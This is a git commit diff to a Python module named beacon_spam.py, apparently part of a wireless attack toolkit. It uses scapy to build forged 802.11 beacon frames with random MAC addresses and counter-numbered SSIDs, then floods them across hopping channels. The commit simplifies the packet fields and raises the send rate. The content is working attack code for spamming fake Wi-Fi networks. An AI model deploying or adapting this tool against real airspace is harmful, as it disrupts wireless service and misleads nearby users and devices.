fd5f1007102eb94634128cb111b035af1df3b76d
ImNotASkidLolus <igor_niedbala@op.pl>
2026-07-18 13:56:16 +0200

    fix

--- src/attacks/beacon_spam.py
+++ src/attacks/beacon_spam.py
@@ -10,11 +10,9 @@ class BeaconSpam:
         self._stop_event = threading.Event()
         self.channel = 1
         self.counter = 1
-        self.start_time = 0
     def stop(self):
         self._stop_event.set()
-    def build_beacon_packet(self,ssid:str, channel):
-        ts = (time.time_ns() - self.start_time)//1000
+    def build_beacon_packet(self,ssid:str):
         rand_mac = str(scapy.RandMAC())
         packet = (
             scapy.RadioTap()/
@@ -22,9 +20,8 @@ class BeaconSpam:
                 addr1='ff:ff:ff:ff:ff:ff',  # Broadcast
                 addr2=rand_mac,
                 addr3=rand_mac) /
-            scapy.Dot11Beacon(timestamp= ts, beacon_interval = 1000, cap=0x31)/
-            scapy.Dot11Elt(ID='SSID', info=str(ssid), len=len(ssid))/
-            scapy.Dot11Elt(ID= 3, info=(bytes([channel])))/ #set the channel
+            scapy.Dot11Beacon(timestamp=1, cap="ESS")/
+            scapy.Dot11Elt(ID='SSID', info=ssid, len=len(ssid))/
             scapy.Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') / # supported rates
             scapy.Dot11Elt(ID='RSNinfo', info=( #RSN info
                 b'\x01\x00'
@@ -47,19 +44,14 @@ class BeaconSpam:
         else:
             self.channel = 1
     def start_beacon_spam(self):
-        self.start_time = time.time_ns()
         self.next_channel()
         while not self._stop_event.is_set() and not globals.larp_mode:
             try:
                 ssid = globals.selected_ssid + str(self.counter)
-                self.counter +=1
-                if self.counter > 9999:
-                    self.next_channel()
-                    self.counter = 1
-                pkt = self.build_beacon_packet(ssid, self.channel)
-                for i in range(2):
-                    scapy.sendp(pkt, iface=self.IFACE, verbose=False, inter=0.1)
-                globals.bc += 1
+                self.counter+=1
+                pkt = self.build_beacon_packet(ssid)
+                self.next_channel()
+                scapy.sendp(pkt, iface=self.IFACE, verbose=0, inter=0.010, count=8)
             except Exception as e:
                 print(e)
                 time.sleep(0.1)                
